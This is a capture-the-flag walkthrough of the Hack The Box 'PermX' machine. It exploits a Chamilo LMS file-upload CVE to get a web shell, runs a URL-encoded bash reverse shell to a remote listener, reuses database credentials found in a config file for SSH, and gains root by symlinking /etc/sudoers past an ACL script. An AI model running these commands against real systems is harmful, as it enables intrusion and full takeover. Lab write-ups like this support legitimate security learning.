# TL;DR

1. Ran nmap scan and found that there are two ports open on port 80 and port 22
2. Added domain to /etc/hosts and navigated to the site on port 80
3. Saw it was a static site and started to bruteforce directories and subdomains
4. Found a subdomain called lms.permx.htb and navigated to it
5. Found it led to a login screen for an LMS called Chamilo
6. Tried default creds and did not get anything 
7. Looked up vulnerabilities for Chamilo and found a POC to get a web shell
8. Ran the exploit, got a web shell, and then got a reverse shell
9. Rummaged through files and found a configuration.php file which contained creds for the LMS database
10. Used those creds for the local 'mtz' user on ssh and obtained a user shell
11. Used 'sudo -l' command and found a file called 'acl.sh' in the opt directory
12. Saw that 'acl.sh' can change perms for any file within the /home/mtz directory
13. Created symbolic link to the sudoers file and run the acl.sh script to give mtz user access to write into the file
14. Wrote ```mtz ALL=(ALL:ALL) NOPASSWD: /bin/su``` in the sudoers file
15. Ran ```sudo su``` and got root

# Detailed Writeup

To start off the box, I had ran this nmap command: nmap -vv -sVC -p- --min-rate=10000 -oA nmap/permx 10.10.11.23

Which gave me the following results:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/nmap.png)

We can see that we have just two ports open: port 22 and port 80. Port 80 also shows the nmap is redirecting to http://permx.htb. I added this to ```/etc/hosts``` file and navigated to the site. 

During this time, I also looked into the vulnerabilities for the apache server version since it show up in the namap scan. I had found a vulnerability related to a HTTP smuggling request but I would need a form to start messing with something like that. That being said this is what the site looks like when you first navigate to it:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/homepage.png)

I tried looking around for a form. I tried the contact form, but that was not sending any requests back to the server. I kept clicking around but still couldn't find anything. 

With that tried, I had started to bruteforce directories and subdomains with fuff. 

After running through that, I had found a subdomain: ```http://lms.permx.htb``` which led to an LMS called Chamilo, which is an open source LMS:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/lms.png)

In this next part, I should have starting looking for a way to find the version of Chamilo. But I went straight into finding a vulnerability which I do not advise. But I had gotten lucky and found a github page: ```https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS```, which had code that could scan if the given Chamilo site was vulnerable to the CVE. It was a somewhat recent CVE so I had assumed it would work and it did.

But the right way to go about this is to, again, try to identify the version of the LMS. This can be done if you bruteforce the directories where you would find a ```robots.txt``` file. There is a directory in it that has the documentation of the LMS which states which version it has. You would then go and lookup vulnerabilities for this version of Chamilo where you would find that github page. 

Here is the ```robots.txt``` and ```documentation directory``` respectively:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/robots.png)
![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/documentation.png)

But using that exploit from the github page, it gives you a link to the webshell on the server. I had give the webshell this reverse shell command url encoded: ```bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F9001%200%3E%261%27``` and used netcat to catch the shell. 

Here is the webshell page and catching the reverse shell respectively: 

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/webshell.png)
![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/reverseShell.png)

Now that we have the webshell let's look around for configuration files. Reason being that we are trying to look for passwords and possible usernames that have been left around. We can try to use these creds on services like on SSH to get user access. You can find the users that can have a shell on the box with this command: ```cat /etc/passwd | grep "sh$"```

I used the command and found an ```mtz``` user:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/foundUser.png)

Now let's try to find those passwords. I used this command to find files that have configuration in their name: ```find /var/www/ -type f -name "*.conf"```

I ended up finding this directory: ```/var/www/chamilo/app/config/configuration.php``` where is contained the password for the LMS database. 

I tried to to use this password with the mtz user with ssh on the server was able to get user:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/Machines/PermX/user.png)

Once I got root I used the following command to see what files I could use without needing a password for sudo: ```sudo -l```

It show me a file directory: ```/opt/acl.sh```, which the code showed this:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

The code itself checks for a designated file in the ```/home/mtz``` directory from an argument and changes the permissions of the file based off of arguments as well. This being case, I thought to try to create a symbolic link to the sudoers file using this command: ```ln -s /etc/sudoers ./sudoers.txt``` and then run the acl.sh script like such: ```/opt/acl.sh mtz rwx /home/mtz/sudoers.txt```

Once I did this I used vim to edit the sudoers file and added the following under the mtz user to able to switch to the root user:

```mtz ALL=(ALL:ALL) NOPASSWD: /bin/su```

After saving it I ran this command: ```sudo su``` and got root. 